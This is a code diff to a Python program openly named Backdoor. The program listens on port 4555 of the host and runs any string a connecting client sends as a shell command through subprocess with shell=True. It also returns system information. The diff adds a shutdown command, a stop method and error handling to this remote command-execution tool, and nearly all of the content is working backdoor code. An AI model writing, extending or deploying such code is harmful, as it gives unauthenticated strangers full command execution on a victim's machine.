@@ -16,21 +16,37 @@ class Backdoor:
         self.clients = set()
         # Create a lock for synchronizing access to clients list
         self.lock = threading.Lock()
+        self.running = True
 
     def start(self):
         print(f"[+] Backdoor listening on {self.host}:{self.port}")
+        print(f"[!] Waiting for incoming connections...")
         self.socket.bind((self.host, self.port))
-        # Allow up to 5 pending connections
-        self.socket.listen(5)
+        self.socket.listen()
+
+    def stop(self):
+        self.running = False
+        self.socket.close()
+        print(f"[!] Backdoor is shutting down on {self.host}:{self.port}\n")
 
     def run(self):
         self.start()
-        while True:
-            client_socket, addr = self.socket.accept()
-            if (client_socket, addr) not in self.clients:
-                self.clients.add((client_socket, addr))
-                threading.Thread(target=self.handle_client, args=(client_socket, addr)).start()
-                print(f"[+] Got a connection from {addr[0]} {addr[1]}")
+        while self.running:
+            if self.socket.fileno() == -1:
+                print("[-] Server socket is closed. Exiting...")
+                break
+            try:
+                client_socket, addr = self.socket.accept()
+                if (client_socket, addr) not in self.clients:
+                    self.clients.add((client_socket, addr))
+                    threading.Thread(target=self.handle_client, args=(client_socket, addr)).start()
+                    print(f"[+] Got a connection from {addr[0]} {addr[1]}")
+            except OSError as e:
+                if e.errno == 10038:
+                    print("[-] Server socket is closed. Exiting...")
+                else:
+                    print(f"[-] Error accepting connection: {e}")
+                break
 
     def handle_client(self, client_socket, addr):
         try:
@@ -41,7 +57,10 @@ class Backdoor:
                     break
                 cmd = data.decode('utf-8')
                 if cmd.lower() == 'exit':
-                    print(f"[-] Client at {addr[0]} {addr[1]} requested to exit")
+                    print(f"[-] Client at {addr[0]} {addr[1]} got disconnected!")
+                    break
+                if cmd.lower() == 'shutdown':
+                    self.stop()
                     break
                 elif cmd in self.custom_commands:
                     if cmd == 'info':
@@ -65,6 +84,7 @@ class Backdoor:
                 if (client_socket, addr) in self.clients:
                     # Remove client if it exists in the list
                     self.clients.remove((client_socket, addr))
+
     def run_command(self, cmd):
         try:
             result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -85,8 +105,10 @@ class Backdoor:
         info += f"Processor Info: {platform.processor()}"
         return info
 
+
 if __name__ == "__main__":
     host = socket.gethostbyname(socket.gethostname())
     port = 4555
     backdoor = Backdoor(host, port)
     backdoor.run()
+
